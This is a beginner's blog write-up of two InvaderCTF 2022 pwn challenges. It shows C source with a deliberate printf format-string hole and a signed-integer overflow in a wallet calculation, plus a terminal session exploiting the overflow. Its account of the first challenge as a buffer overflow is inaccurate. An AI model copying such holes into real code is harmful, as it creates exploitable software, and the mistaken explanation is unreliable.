Hi guys!, 

This is Mj0ln1r and this is my first blog, writeup and first CTF as well. All new ? haha. 

I started learning new skills and playing CTF's as well to gain hands on experience in the security field. Coming to this blog, its all about my solved challenges in InvaderCTF 2022.

InvaderCTF is a CTF competion which was organized by our collenge[RGUKTN] alumni those are working at great positions with the skills learned through CTF's.
There is a list of categories in this CTF such as “web”, “pwn”, “reverse”, “cryptography”, and “miscellaneous”.
And i solved some challenges from each category.

In this post i am going to explain about the procedure i followed to solve `PWN` challenges.

# PWN Challenges

## Format Strings

Can you exploit echo file to get the FLAG. nc 198.199.123.169 9003

Provided source code `echo.c`

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
void initialize()
{
  alarm(60);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
}

int echo(){
  char FLAG[] = "InvaderCTF{this_is_not_flag_flag_is_on_the_remote_server}";
  char buffer[0x20];
  puts("Can you leak the flag?");
  puts("Enter input to echo back:\n");
  read(0,buffer, 0x20);
  printf(buffer);
}
int main()
{
  initialize();
  echo();
}
```

First of all i executed the provided binary file `echo`.The program asks for a input. Observe the source program the input is going to be stored in `buffer[0x20]`.The `0x20` is equals to 32 in decimal.

If i gave more than 32 characters as input a `bufferoverflow` will occur it may leads to an unintend outputs.
lets see,

![Format Strings](/assets/img/post_img/format.png){: w="600" h="400"}

DOOOONE.....!

So, this is a simple bufferoverflow problem. In this way i got this flag `^_^`

## FoodCourt Overflow

![Format Strings](/assets/img/post_img/fc.png){: w="400" h="400"}

The name itself says that its a overflow problem again `^_~`

The source code of the program running in the remote server is as follows
```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int wallet = 200;

int order(char *item, int cost) {
    int n;
    printf("Input the number of %s you want to buy?\n", item);
    printf("> ");
    scanf("%d", &n);

    if (n > 0) {
        cost = cost * n;
        printf("That will cost Rs%d.\n", cost);
        if (cost <= wallet) {
            puts("Order placed!");
            wallet -= cost;
        } else {
            puts("Ah man, you don't have enough money to buy this order");
            n = 0;
        }
    } else {
        puts("Nah, buy something.");
    }

    return n;
}
void initialize()
{
  alarm(60);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
}

int main() {
    int item;
    puts("Welcome to RGUKT Food Court!");
    puts("We are giving free 200 RS wallet amount to our online customers.");
    puts("Sadly, you don't have enough money to buy the tastiest dish named Flag :/? Or is it? \n");

    while (1) {

        printf("Wallet Amount Rs%d.\n", wallet);
        puts("Menu: ");
        puts("1. Noodles: 50");
        puts("2. Biryani: 100");
        puts("3. Soft Drink: 20");
        puts("4. Flag: Rs 1000");
        puts("0. Logout\n");
        puts("Which item would you like to Order?");

        printf("> ");
        scanf("%d", &item);

        switch (item) {
            case 0:
                printf("Logging out");
                return 0;
            case 1:
                order("Nooooodles", 50);
                break;
            case 2:
                order("Dum Biryani", 100);
                break;
            case 3:
                order("Soft Drink", 1);
                break;
            case 4:
                if (order("buy the today's special dish - flag", 1000) > 0) {
                    FILE *fp = fopen("flag.txt", "r");
                    char flag[100];

                    if (fp == NULL) {
                        puts("Create flag.txt in the current working directory");
                        puts("Please report to admin if you saw this error on remote");
                        exit(1);
                    }

                    fgets(flag, sizeof(flag), fp);
                    puts(flag);
                }
                break;
            default:
                puts("Please select a valid item.");
        }
    }
}
```
The Main method is printing the menu and asking the user for the choice.Initially my `wallet = 200`.i.e balance. I am able to buy anything from the foodcourt except flag, cause it costs 1000. In order function i have to enter number of items i want to buy,i.e `n`. The cost is going to be multiplied with the number of items `cost = cost * n`. My balance then its going to place my order. i.e `cost <= wallet`. Then my balance is going to be update. `wallet = wallet - cost`.

Here i got an ideaaaa.. I see noodles costs 50 and it substracts the total cost from the wallet.but what if the cost is negative? Then the cost is going to be added to the wallet, and if cost is negative enough, then we can get a huge wallet balance.

How do we get a negative cost? Notice the cost is multiplied with n. `cost = cost * n`. So, that if we make the n as negative the cost becomes negative.

`n` is declared as integer , specially a signed integer. So i have to give a number out of signed int range.

signed int range for 
- 2 bytes(-32,768 to 32,767)
- 4 bytes(-2,147,483,648 to 2,147,483,647)

The input is multiplied with 1000 and to get an overflow we have to enter a number which gives the result greater than 2,147,483,647.
So, if i enter number greater than 21474835 the result will be in out of range.

Lets Get That Fa Fa Flag .. `*_~`
```bash
$ gcc food-court-overflow.c
$ ./a.out
Welcome to RGUKT Food Court!
We are giving free 200 RS wallet amount to our online customers.
Sadly, you dont have enough money to buy the tastiest dish named Flag :/? Or is it? 

Wallet Amount Rs200.
Menu: 
1. Noodles: 50
2. Biryani: 100
3. Soft Drink: 20
4. Flag: Rs 1000
0. Logout

Which item would you like to Order?
> 4
Input the number of buy the todays special dish - flag you want to buy?
> 21474836
That will cost Rs-480.
Order placed!
InvaderCTF{this_is_not_flag_flag_is_on_the_remote_server}
Wallet Amount Rs680.
Menu: 
1. Noodles: 50
2. Biryani: 100
3. Soft Drink: 20
4. Flag: Rs 1000
0. Logout

```
I got the flag here but it says we have to do same process in the remote server to get the original flag.
